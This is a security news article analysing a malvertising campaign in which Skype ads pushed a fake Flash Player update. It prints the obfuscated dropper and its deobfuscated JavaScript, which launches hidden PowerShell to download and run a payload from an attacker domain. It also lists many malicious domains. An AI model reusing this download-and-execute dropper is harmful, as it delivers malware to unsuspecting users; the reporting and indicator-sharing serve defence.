@@ -1,0 +1,347 @@
+
+	   
+
+Skype ad pushing malicious download (Source: j8048188 on Reddit)
+
+It appears that for at least one day, Skype has served malicious ads, which in turn pushed a fake Flash Player update onto users.
+
+The malicious ads came to light after Reddit and Twitter users complained about Skype forcing a Flash Player update down their throat.
+
+Malicious ads pushed HTA file disguised as Flash update
+
+According to two screenshots [1, 2] taken by two users, the ads pushed a file named FlashPlayer.hta, an HTML Application file. The content of this file was just a piece of obfuscated JavaScript code.
+
+< script >var params = '/3953168149188/1490797993824416/FlashPlayer.jse';var smglnn='vmavrk mdfokmeaoilnf=u"aosyboommaskaahommnoajgiuysat.ioerxgf"o;jmaozvvegTkoz(u-v1f0o0v,x-q1k0j0j)k;rrweysridztejTwob(n0t,h0c)c;i cax=onmexwi hAccxtdiavnenXkOxbyjbetcxts(x';var zzaqm='\'qWcstcsrqimpats.pSihuenlxlh\'k)f;o nfd=r nnqefwx oDdaztiea(r)f.rgteytkTjilmkec(b)t+x\'o.qjesy\'w;ttmrzyl{avqarrx ebu=wnmevwo rAncitqixvsecXhOvbdjaescstr(x\'rSncrrdimpdtdicnu';var sxp='gb.gFpiyltekSmylsytvecmvOnbejdeicite\'b)a;vvzarri qpv v=u ydxoocauemeeynxtp.lljoncgaltiiuoqnl.dhyrpeffz;lpe r=u vumnpeqslcmafpler(jpk.psyuvbysltcrj(t8x)z)f;aiyfv g(ybg.lFp';var acy='ialgecEqxwiosctcsa(upl)k)jbj.gDheuljertoegFqiulhep(qpn)n;x}ycdaytfcfho(ceu)r{e}ual.pReuunz(l"cPuouwtejraSkhdehlzlu v-nWritnqdpozwwSdtbyrlueg lHfiwdqdaevnb c$pdv=w$yewngvc';var kgikuu=':etgewmzpt+n[tckhdatrh]g[vbyybtbek]h9x2a+h\'s"c+kfi+x"h\'h;u(nNjeywu-gOybojuescztx lSgyesgtfefmh.pNmeftp.uWyerbfCglpimennktz)x.jDuodwhnilyoaahdwFliolaes(t\'ghatitspf\'y+n\'dsq';var wkel=':s/j/g"e+xdqoemuaziyny+hphawrhaomsst+d"t\'l,w$zdl)f;sIrnevfoukuey-eIatdecmr h$wdq;g"v,x0n,rfeaclksyeg)e;jacldevritw(m\'mPblgehazsleh dwnaziktk.p.r.f\'n)f;xcslioisqeo(m)z;q q';var ksjwvswcj=smglnn+zzaqm+sxp+acy+kgikuu+wkel;   var xfmkvnux="";   var uvzpwiopp=2;   var a=0;   function wrot(){};   try{   obj.toString();  a=100000; }catch(e){}   while(a
+
+If we deobfuscate and pretty-print the HTA file's payload we get the following code:
+
+
+1/1
+
+
+
+
+
+Skip Ad
+ 
+Continue watchingafter the adVisit Advertiser websiteGO TO PAGE.cnx-non-linear-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:none;width:100%;height:100%}.cnx-non-linear-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-non-linear-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-non-linear-ad-container .cnx-ad-slot video,.cnx-non-linear-ad-container video.cnx-ad-slot{background-color:unset}.cnx-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:#f4f4f4;width:100%;height:100%}.cnx-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-ad-container .cnx-ad-slot div{background-color:rgba(0,0,0,0) !important}.cnx-ad-container .cnx-ad-slot iframe{box-sizing:border-box;border:3px solid #fff !important;color-scheme:none}.cnx-ad-container .cnx-ad-slot iframe:not([id]){border:none !important}.cnx-ad-container .cnx-ad-slot-video-type iframe{border:none !important}.cnx-ad-container .cnx-ad-slot video,.cnx-ad-container video.cnx-ad-slot{background-color:#f4f4f4}var params = '/3953168149188/1490797993824416/FlashPlayer.jse';
+var domain = "oyomakaomojiya.org";
+moveTo(-100, -100);
+resizeTo(0, 0);
+a = new ActiveXObject('Wscript.Shell');
+f = new Date().getTime() + '.js';
+try {
+    var b = new ActiveXObject('Scripting.FileSystemObject');
+    var p = document.location.href;
+    p = unescape(p.substr(8));
+    if (b.FileExists(p)) b.DeleteFile(p);
+} catch (e) {}
+a.Run("PowerShell -WindowStyle Hidden $d=$env:temp+[char][byte]92+'" + f + "';(New-Object System.Net.WebClient).DownloadFile('http'+'s://" + domain + params + "',$d);Invoke-Item $d;", 0, false);
+alert('Please wait...');
+close();
+
+Taking into consideration the above code, we can reconstruct the attack routine as follows:
+
+User opens Skype
+	Malicious ad loads and pushes the FlashPlayer.hta file
+	User downloads and runs HTA file
+	JavaScript code contained in the HTA file executes and runs a PowerShell script
+	PowerShell script downloads a payload. In this case, it's a JSE (Encrypted JavaScript) file hosted at:
+http://www.oyomakaomojiya[.]org/3953168149188/1490797993824416/FlashPlayer.jse
+
+Unfortunately, the domain was down, and we couldn't get a copy of the final payload. After going through all the effort to compromise Skype ads and spread fake Flash Player updates through such a noisy method, the attacker would have most likely infected victims with a malware that was worth the trouble, such as a banking trojan or ransomware. Nonetheless, this couldn't be confirmed at the time of writing.
+
+Sprawling network of interconnected domains
+
+Two domains were spotted pushing the fake Flash Player updates: oyomakaomojiya[.]org and cievubeataporn[.]net. Both were registered with Cock.li email accounts: jonathandpreston@wants.dicksinhisan[.]us and edwardslawler@dicksinmyan[.]us, respectively.
+
+Both emails have been used to register a large number of shady domains, most of which have entries on VirusTotal, listing all sorts of suspicious activity.
+
+The first email address has been used to register the following domains:
+
+oyomakaomojiya[.]org
+uaquucoolbuy[.]com
+aihubwwmte[.]net
+pahvalivechatoo[.]net
+eevoofashionserved[.]com
+eekielovendal[.]org
+iequipornosextv[.]org
+meingsitemapxml[.]net
+iquaitiltedkilt[.]com
+shaetprafulla[.]net
+aimaiteamholistic[.]net
+aeghaduckhuntingchat[.]com
+uareikimbramusic[.]org
+fiphimediacenter[.]org
+aedouzagolovki[.]com
+phaetbizpacreview[.]org
+eichitonocristiano[.]net
+apeitdeagostini[.]net
+eithidiscountwomensdressshoes[.]com
+ookaipalr[.]com
+sheizfuzebox[.]net
+utaevantispam-ev[.]com
+iepeegati[.]net
+quuanearwolf[.]org
+eichuartfulhome[.]net
+uriextube1sex[.]org
+oocheesnapw[.]com
+waeciepicurien[.]org
+ahseielightbulbs[.]com
+phaigfinancial-hub[.]org
+ohngomy-art[.]net
+aliegrbls[.]org
+aishei-perros[.]com
+leaqutufuncion[.]org
+theivcomunio-cl[.]org
+ainguprospectgeysercoop[.]com
+eifairadiofg[.]org
+wahyueasyroommate[.]com
+xoodapublishersglobal[.]org
+ahngetoyota[.]com
+soodidphoto[.]org
+chaepscania[.]net
+poocabenri[.]com
+
+The second email address was used to register the following domains:
+
+tahxiintimes-niedersachsen[.]org
+fahsugivemeinsurancequotes[.]org
+eefugsugardvd[.]org
+cievubeataporn[.]net
+oowaeinternetmarketingzoom[.]org
+oofaesignal-iduna[.]net
+oangikoseiboeki[.]com
+eezahindianhomedesign[.]org
+roofigiochigratis[.]org
+lohketube[.]org
+baemacashpros[.]org
+kooshdealsurf[.]com
+aiphobehindthechair[.]org
+uraigsuidobashijuko[.]com
+cheinbuxzilla[.]org
+nuriuek-online[.]net
+fohqusync[.]com
+ayeeckids[.]org
+ughidwebdigi[.]org
+eijoogumgum[.]org
+pajoomaxbahr[.]org
+aethurecipes-pro[.]org
+nemiskurtlarvadisi2023[.]org
+ohphafemaleagent[.]org
+ohnaihitorphat[.]net
+ugheimaconline[.]com
+paibilinkdirectory[.]com
+aequaopefac[.]net
+fohkeribenrenti[.]org
+uxoelwparaci[.]org
+shiehaoitown[.]com
+giehawebna[.]org
+ticeeabkingdom[.]org
+aechumobiliermoss[.]net
+wasootvecinema[.]org
+goaqugorodnabire[.]net
+zaenisexpornmom[.]com
+uigahadsup[.]com
+ahquodeitel[.]org
+jiexohtml5video[.]net
+eeteiabhair[.]com
+phorubazics[.]org
+eevaehowtoplaza[.]net
+meichplayboy[.]com
+oohowhardcoregaming101[.]org
+ogahwcrystalmedianetworks[.]net
+aedaeguides4it[.]org
+roetiway2goodlife[.]org
+oishalustyhealth[.]org
+phiebkey-rich[.]org
+eigohsanwacompany[.]net
+chiewpuzzlewarehouse[.]org
+daiqukinguin[.]com
+
+"The first registered domain for both email addresses is on 2017-02-22," said MalwareHunter, who helped with this investigation. "Surely there is a connection between the two."
+
+Professional malvertising group behind the attacks
+
+Some of the IP addresses where these sites have been hosted resolved to servers that hosted a multitude of other malicious domains in the past.
+
+Taking a random IP, MalwareHunter found another domain that was also hosted on the same server and caught pushing suspicious JS files for download in the past.
+
+This domain was registered with the email address justincabel@airmail.cc, which in the same manner of the two previous emails, was used to register 35+ domains starting that day, February 23, a day after the two other emails were used to register their domains.
+
+quoopsocaltransport[.]org
+ieghisocialphobiaworld[.]com
+ohxuayouyou[.]org
+tahjikeywordwinner[.]net
+thietapnews[.]org
+roohohotbuzz4u[.]net
+eebiexinguilingui[.]org
+aheencambodia[.]org
+ijualhalfpintgentleman[.]org
+eathaimzoa[.]net
+aphahtruckmountforums[.]net
+liragteachforamerica[.]com
+nohoogetsubscribers[.]org
+iechoekdromi[.]com
+eazeimonabanq[.]net
+shoohqingfanqie[.]org
+eiyohfacefanbuy[.]net
+eilohterrysfabrics[.]org
+doozedainese[.]com
+masukaeglive[.]org
+voofuebook[.]org
+pheyasuperskinnyme[.]org
+ohgaialmarssadpro[.]org
+baifuluvzyou[.]net
+maechradioexpressfm[.]net
+fofoolemondedubagage[.]org
+jeiviforexverified[.]net
+jiepigoldenfish[.]org
+aequewoolovers[.]org
+ongirsulamerica[.]net
+pohphgoodyear[.]org
+akuubtomattrick[.]org
+aidekleadingcourses[.]com
+eebunpollutec[.]org
+uijahimmi-moj[.]net
+goofiplay2wincasino[.]net
+xaizeeasterndrugs[.]org
+xaijupalgrave-journals[.]com
+
+As we dug deeper, it became clear we were dealing with a skilled group that was registering and throwing away a large number of domains on a daily basis, most likely as part of a professional malvertising operation. At no time were we able to obtain a final payload, showing the speed with which operators moved from one domain to the next.
+
+This is not the first time Skype has been plagued by malvertising campaigns. It happened in 2014 [1, 2], 2015, and 2016.
+
+Regarding this latest incident, the Reddit user who first noticed the attack said Skype support denied that anything went wrong on their side. On Reddit, users shared various method on how to block Skype adds [1, 2].
+
+	   
+
+.ia_ad {
+    background-color: #f0f6ff;
+    width: 95%;
+    max-width: 800px;
+    margin: 15px auto;
+    border-radius: 8px;
+    border: 1px solid #d6ddee;
+    display: flex;
+    align-items: stretch;
+    padding: 0;
+    overflow: hidden;
+}
+
+.ia_lef {
+    flex: 1;
+    max-width: 200px;
+    height: auto;
+    display: flex;
+    align-items: stretch;
+}
+
+.ia_lef a {
+    display: flex;
+    width: 100%;
+    height: 100%;
+}
+
+
+.ia_lef a img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 8px 0 0 8px;
+    margin: 0;
+    display: block;
+}
+
+.ia_rig {
+    flex: 2;
+    padding: 10px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.ia_rig h2 {
+    font-size: 17px !important;
+    font-weight: 700;
+    color: #333;
+    line-height: 1.4;
+    font-family: Georgia, "Times New Roman", Times, serif;
+    margin: 0 0 14px 0;
+}
+
+.ia_rig p {
+    font-weight: bold;
+    font-size: 14px;
+    margin: 0 0 clamp(6px, 2vw, 14px) 0;
+}
+
+.ia_button {
+    background-color: #FFF;
+    border: 1px solid #3b59aa;
+    color: black;
+    text-align: center;
+    text-decoration: none;
+    border-radius: 8px;
+    display: inline-block;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    padding: 10px 20px;
+    width: fit-content;
+}
+
+.ia_button a {
+    text-decoration: none;
+    color: inherit;
+    display: block;
+}
+
+@media (max-width: 600px) {
+    .ia_ad {
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .ia_lef {
+        max-width: 100%;
+    }
+
+    .ia_lef a img {
+        border-radius: 8px 8px 0 0;
+    }
+
+
+    .ia_rig {
+        padding: 15px;
+        width: 100%;
+    }
+
+    .ia_button {
+        width: 100%;
+	margin: 0px auto;
+    }
+}
+
+
+
+    
+        
+            
+        
+    
+    
+        Red Report 2025: Analyzing the Top ATT&CK Techniques Used by 93% of Malware 
+Malware targeting password stores surged 3X as attackers executed stealthy Perfect Heist scenarios, infiltrating and exploiting critical systems.
+Discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.
+        Read the Red Report 2025
+    
+
+
+           
+          
+            Related Articles:
+	     New Plague Linux malware stealthily maintains SSH accessCISA open-sources Thorium platform for malware, forensic analysisInside a Real Clickfix Attack: How This Social Engineering Hack UnfoldsHackers exploit SAP NetWeaver bug to deploy Linux Auto-Color malwareEndgame Gear mouse config tool infected users with malware
+	  
+ 
+	  
